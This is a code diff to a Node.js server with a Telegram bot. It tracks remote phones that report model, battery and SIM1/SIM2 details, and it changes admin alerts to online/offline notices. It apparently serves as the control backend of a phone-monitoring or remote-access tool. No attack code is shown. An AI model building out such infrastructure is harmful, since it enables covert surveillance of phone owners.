@@ -50,14 +50,24 @@ app.post('/connect', (req, res) => {
   const { uuid, model, battery, sim1, sim2 } = req.body;
   if (!uuid) return res.status(400).send('missing uuid');
 
-  devices.set(uuid, { model, battery, sim1, sim2, lastSeen: Date.now() });
+  const existingDevice = devices.get(uuid);
+  const wasOffline = !existingDevice || existingDevice.notifiedState === 'offline';
 
-  if (!notifiedDevices.has(uuid)) {
-    ADMIN_IDS.forEach(id =>
-      bot.sendMessage(id, `📲 *Device Connected*\n${formatDevice(devices.get(uuid))}`, { parse_mode: 'Markdown' })
-    );
-    notifiedDevices.add(uuid);
+  const deviceData = {
+    model,
+    battery,
+    sim1,
+    sim2,
+    lastSeen: Date.now(),
+    notifiedState: 'online' // Start with online state
+  };
+  devices.set(uuid, deviceData);
+
+  if (wasOffline) {
+    const message = `🟢 *Device Connected*\n${formatDevice(deviceData)}`;
+    ADMIN_IDS.forEach(id => bot.sendMessage(id, message, { parse_mode: 'Markdown' }));
   }
+
   res.sendStatus(200);
 });
 
@@ -250,24 +260,19 @@ bot.on('callback_query', cb => {
   }
 });
 
-// ===== AUTO STATUS REFRESH =====
-setInterval(async () => {
-  if (devices.size === 0) return;
-  let statusText = '📡 *Device Status Update*\n\n';
-  for (let [uuid, d] of devices.entries()) statusText += `${formatDevice(d)}\nUUID: \`${uuid}\`\n\n`;
-  for (let id of ADMIN_IDS) {
-    try {
-      if (lastStatusMessageId) {
-        await bot.editMessageText(statusText, { chat_id: id, message_id: lastStatusMessageId, parse_mode: 'Markdown' });
-      } else {
-        const sent = await bot.sendMessage(id, statusText, { parse_mode: 'Markdown' });
-        lastStatusMessageId = sent.message_id;
-      }
-    } catch (e) {
-      lastStatusMessageId = null;
+// ===== DEVICE OFFLINE CHECKER =====
+const OFFLINE_THRESHOLD = 70 * 1000; // 70 seconds, must be greater than the app's polling interval
+setInterval(() => {
+  for (let [uuid, device] of devices.entries()) {
+    const isOffline = (Date.now() - device.lastSeen) > OFFLINE_THRESHOLD;
+    // Only notify if the state changes from online to offline
+    if (isOffline && device.notifiedState === 'online') {
+      device.notifiedState = 'offline';
+      const message = `🔴 *Device Offline*\n${formatDevice(device)}`;
+      ADMIN_IDS.forEach(id => bot.sendMessage(id, message, { parse_mode: 'Markdown' }));
     }
   }
-}, STATUS_INTERVAL);
+}, 30 * 1000); // Check every 30 seconds
 
 // ===== START SERVER =====
 app.listen(PORT, () => console.log(`✅ Server running on port ${PORT}`));
